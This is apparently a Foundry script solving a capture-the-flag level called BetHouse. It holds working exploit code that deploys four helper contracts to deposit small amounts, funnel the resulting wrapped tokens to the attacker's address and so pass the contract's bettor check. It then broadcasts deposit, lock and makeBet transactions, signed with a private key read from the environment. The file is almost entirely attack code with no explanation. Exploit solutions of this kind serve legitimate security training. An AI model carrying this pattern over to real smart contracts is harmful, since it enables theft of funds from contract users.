// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { BetHouse, Pool, PoolToken } from "../src/BetHouse.sol";

contract Subordinate {

	BetHouse public instance = BetHouse(0xCcE2b5D3eD7Feb8F2C800F4cCB22B790c035F8A7);
	Pool pool = Pool(instance.pool());
	PoolToken wrappedToken = PoolToken(pool.wrappedToken());
	address master;

	constructor () payable {
		master = msg.sender;
		address(pool).call{value: 0.001 ether}(abi.encodeWithSelector(pool.deposit.selector, 0));
	}

	function nowGimmeMyMoneyBack() external {
		wrappedToken.transfer(master, wrappedToken.balanceOf(address(this)));
	}
}

contract BetHouseSolver is Script {
	
	BetHouse public instance = BetHouse(0xCcE2b5D3eD7Feb8F2C800F4cCB22B790c035F8A7);
	
	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

		Pool pool = Pool(instance.pool());
		PoolToken depositToken = PoolToken(pool.depositToken());
		PoolToken wrappedToken = PoolToken(pool.wrappedToken());

		
		console.log(address(pool));
		console.log(address(depositToken));
		console.log(address(wrappedToken));

		console.log("======== my current state =======");
		console.logBytes32(bytes32(depositToken.balanceOf(me)));
		console.logBytes32(bytes32(wrappedToken.balanceOf(me)));
		console.log("am i a bettor ?", instance.isBettor(me));

		// address(pool).call{value: }();


		
		Subordinate s1 = new Subordinate{value: 0.001 ether}();
		Subordinate s2 = new Subordinate{value: 0.001 ether}();
		Subordinate s3 = new Subordinate{value: 0.001 ether}();
		Subordinate s4 = new Subordinate{value: 0.001 ether}();
		
		s1.nowGimmeMyMoneyBack();
		s2.nowGimmeMyMoneyBack();
		s3.nowGimmeMyMoneyBack();
		s4.nowGimmeMyMoneyBack();

		depositToken.approve(address(pool), 5);
		pool.deposit(5);
		pool.lockDeposits();
		instance.makeBet(me);
		
		console.log("======== my current state =======");
                console.logBytes32(bytes32(depositToken.balanceOf(me)));
                console.logBytes32(bytes32(wrappedToken.balanceOf(me)));
                console.log("am i a bettor ?", instance.isBettor(me));


		
		vm.stopBroadcast();


	}

}
